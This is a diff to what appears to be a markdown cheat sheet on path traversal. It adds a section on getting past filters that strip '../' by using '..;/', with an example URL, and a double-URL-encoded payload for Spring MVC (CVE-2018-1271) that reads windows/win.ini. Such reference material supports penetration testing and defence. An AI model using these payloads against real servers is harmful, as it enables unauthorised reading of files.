@@ -9,11 +9,13 @@
     * [16 bits Unicode encoding](#)
     * [UTF-8 Unicode encoding](#)
     * [Bypass "../" replaced by ""](#)
+    * [Bypass "../" with ";"](#)
     * [Double URL encoding](#)
     * [UNC Bypass](#unc-bypass)
 * [Path Traversal](#path-traversal)
     * [Interesting Linux files](#)
     * [Interesting Windows files](#)
+* [References](#references)
 
 ## Tools
 
@@ -62,6 +64,13 @@ Sometimes you encounter a WAF which remove the "../" characters from the strings
 ...\.\
 ```
 
+### Bypass "../" with ";"
+
+```powershell
+..;/
+http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
+```
+
 ### Double URL encoding
 
 ```powershell
@@ -69,6 +78,8 @@ Sometimes you encounter a WAF which remove the "../" characters from the strings
 / = %252f
 \ = %255c
 ```
+
+**e.g:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with `http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini`
 
 ### UNC Bypass
 
